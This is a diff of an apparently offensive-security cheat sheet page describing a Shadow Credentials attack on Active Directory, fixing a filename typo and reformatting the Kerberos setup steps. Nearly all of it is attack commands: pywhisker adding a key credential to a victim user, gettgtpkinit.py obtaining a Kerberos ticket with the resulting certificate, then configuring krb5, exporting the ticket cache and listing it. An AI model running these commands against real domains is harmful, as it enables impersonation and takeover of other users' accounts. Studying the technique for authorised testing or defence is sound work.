@@ -10,17 +10,20 @@
 {% tab title="pywhisker,gettgtpkinit" %}
 * <pre class="language-bash" data-line-numbers><code class="lang-bash">python3 pywhisker --dc-ip &#x3C;IP> -d &#x3C;domain> -u &#x3C;user> -p &#x3C;pass> --target &#x3C;victim-user> --action add
   pip3 install -I git+https://github.com/wbond/oscrypto.git
-  python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '&#x3C;pass>' -dc-ip &#x3C;IP> &#x3C;domain>/&#x3C;victim-username> /tmp/&#x3C;username>.ccachez
+  python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '&#x3C;pass>' -dc-ip &#x3C;IP> &#x3C;domain>/&#x3C;victim-username> /tmp/&#x3C;username>.ccache
   </code></pre>
-* `sudo apt-get install krb5-user -y`
-* `sudo nano /etc/krb5.conf`
-  *   `[libdefaults]`\
-      `default_realm = <domain>`
+* <pre class="language-bash" data-line-numbers><code class="lang-bash"># Run below command to get the config
+  nxc smb &#x3C;DC-IP> --generate-krb5-file config.krb5
 
-      `[realms]`\
-      `domain = {`\
-      `kdc = <DC-FQDN>`\
-      `}`
+  sudo apt-get install krb5-user -y
+  sudo nano /etc/krb5.conf
+      [libdefaults]
+      default_realm = &#x3C;domain>
+      [realms]
+      domain = {
+      kdc = &#x3C;DC-FQDN>
+      }
+  </code></pre>
 * Update `/etc/hosts` file for DC or other server FQDN resolutions
 * `export KRB5CCNAME=/tmp/<username>.ccache`
 * `klist`
